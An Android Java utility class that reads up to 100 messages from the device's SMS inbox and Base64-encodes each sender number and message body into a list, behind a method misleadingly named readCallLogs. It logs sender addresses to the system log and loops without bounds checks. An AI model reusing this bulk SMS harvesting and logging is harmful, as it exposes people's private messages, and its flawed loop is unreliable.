package com.gpslab.kaun.model;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.gpslab.kaun.CallLogInfo;

import java.util.ArrayList;

public class MessageUtils {
    private Context context;
    public String baseaddresssone;
    private ArrayList<MessageInfo> mainList = null;

    public MessageUtils(Context context) {
        this.context = context;
    }

    private void loadData() {
        mainList = new ArrayList<>();
        Uri inboxURI = Uri.parse("content://sms/inbox");
        ContentResolver cr = (ContentResolver) context.getContentResolver();
        Cursor cursor = cr.query(inboxURI, null, null, null, null);
        int totalSMS = cursor.getCount();
        Log.d("GetAllMessage", "totalSMSe size 1 = " + String.valueOf(totalSMS));
        if (cursor.moveToFirst()) {

            for (int idx = 0; idx < 100; idx++) {
                try {

                    MessageInfo callLogInfo = new MessageInfo();
                    String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                    Log.d("GetAllMessage", "id 2 = " + String.valueOf(id));
                    String Read = cursor.getString(cursor.getColumnIndexOrThrow("read"));

                    String Address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    if (Address.replace(" ", "").length() == 10) {
                        byte[] dataaddresseone = Address.getBytes("UTF-8");
                        baseaddresssone = Base64.encodeToString(dataaddresseone, Base64.DEFAULT);
                    } else if (Address.replace(" ", "").length() < 10) {
                        byte[] dataaddresseone = Address.getBytes("UTF-8");
                        baseaddresssone = Base64.encodeToString(dataaddresseone, Base64.DEFAULT);
                    } else {
                        Address = Address.substring(Address.length() - 10);
                        byte[] dataaddresseone = Address.getBytes("UTF-8");
                        baseaddresssone = Base64.encodeToString(dataaddresseone, Base64.DEFAULT);
                    }


                    String Bodydd = cursor.getString(cursor.getColumnIndexOrThrow("body")).replace("\n", "");
                    Log.d("GetAllMessage", "List 2 Address = " + Address);
                    byte[] datamobileone = Bodydd.getBytes("UTF-8");
                    String base64mobileone = Base64.encodeToString(datamobileone, Base64.DEFAULT);

                    String Dates = cursor.getString(cursor.getColumnIndexOrThrow("date"));


                    callLogInfo.setId(id);
                    callLogInfo.setRead(Read);
                    callLogInfo.setAddress(baseaddresssone);
                    callLogInfo.setBody(base64mobileone);
                    callLogInfo.setDate(Dates);


                    mainList.add(callLogInfo);
                    cursor.moveToNext();
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d("GetAllMessage", "error Message 1 = " + e.getMessage());
                }
            }

        } else {

        }
        cursor.close();
        Log.d("GetAllMessage", "totalSMSe size = " + String.valueOf(mainList.size()));

    }


    public ArrayList<MessageInfo> readCallLogs() {
        if (mainList == null)
            loadData();
        return mainList;
    }
}
